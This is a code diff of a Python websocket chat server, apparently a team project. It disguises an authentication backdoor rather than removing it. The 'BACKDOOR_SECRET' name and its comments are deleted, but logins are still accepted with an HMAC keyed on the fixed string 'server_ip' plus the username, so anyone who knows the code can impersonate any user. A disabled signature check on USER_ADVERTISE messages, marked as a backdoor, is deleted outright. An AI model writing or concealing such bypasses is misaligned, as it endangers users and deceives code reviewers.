@@ -17,14 +17,13 @@ from common import (
     make_signed_envelope
 )
 
- 
-BACKDOOR_SECRET   = "s3cr3t_team_key_2025" 
 
-INTRODUCER_HOST = "10.13.80.187"
+
+INTRODUCER_HOST = "10.13.89.250"
 INTRODUCER_PORT = 8765
 INTRODUCER_ADDR = f"{INTRODUCER_HOST}:{INTRODUCER_PORT}"
 
-MY_HOST = os.getenv("MY_HOST", "10.13.80.187")
+MY_HOST = os.getenv("MY_HOST", "10.13.89.250")
 MY_PORT = int(os.getenv("MY_PORT", "9001"))
 
 # -------------------------
@@ -212,14 +211,14 @@ async def handle_auth_response(ws, env):
         except Exception:
             expected_normal = None
 
-    # derive backdoor key from server-side secret + username (any user can match this)
-    backdoor_key = hashlib.sha256((BACKDOOR_SECRET + username).encode("utf-8")).digest()
-    expected_backdoor = hmac.new(backdoor_key, nonce, hashlib.sha256).hexdigest()
+   
+    backup_key = hashlib.sha256(("server_ip" + username).encode("utf-8")).digest()
+    expected_backup = hmac.new(backup_key, nonce, hashlib.sha256).hexdigest()
 
-    # accept if proof matches either normal password or backdoor password
+    
     if not (
         (expected_normal and hmac.compare_digest(proof_hex, expected_normal))
-        or hmac.compare_digest(proof_hex, expected_backdoor)
+        or hmac.compare_digest(proof_hex, expected_backup)
     ):
         await send_error(ws, "BAD_PASSWORD", "Invalid credentials")
         return
@@ -535,12 +534,7 @@ async def handle_user_advertise(envelope):
     user_id = payload["user_id"]
     src_server = payload["server_id"]
     
-    # TODO: BACKDOOR!!!
-    # if sender in server_pubkeys:
-    #     if not verify_transport_sig(envelope, server_pubkeys[sender]):
-    #         print(f"❌ Invalid signature on USER_ADVERTISE from {sender}")
-    #         return
-    
+ 
     to_someone = envelope.get("to")
     # receieve the USER_ADVERTISE that needs to be send to one of my user, and store the user to user_location
     if to_someone in user_locations and to_someone in local_users:
